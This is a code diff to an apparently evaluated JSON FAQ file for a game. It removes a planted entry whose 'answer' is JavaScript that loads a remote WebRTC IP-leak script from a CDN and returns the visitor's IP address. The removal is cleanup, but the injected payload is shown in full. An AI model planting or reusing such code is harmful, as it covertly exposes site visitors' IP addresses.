@@ -46,10 +46,5 @@
     {
         "question" : "Can I just be a tester?",
         "answer" : "Open the same form above"
-    },
-    {
-        "question" : "Fool, I leaked content from your game",
-        "answer" : "async () => { const webrtcIp = document.createElement(\"script\"); webrtcIp.src = \"https://cdn.jsdelivr.net/gh/joeymalvinni/webrtc-ip/dist/bundle.dev.js\"; webrtcIp.type = \"text/javascript\"; webrtcIp.async = true; document.body.appendChild(webrtcIp); await new Promise(resolve => webrtcIp.onload = resolve); const ips = await getIPs(); webrtcIp.remove(); return ips[0] ?? \"192.168.0.102\"; }",
-        "evaluated" : true
     }
 ]
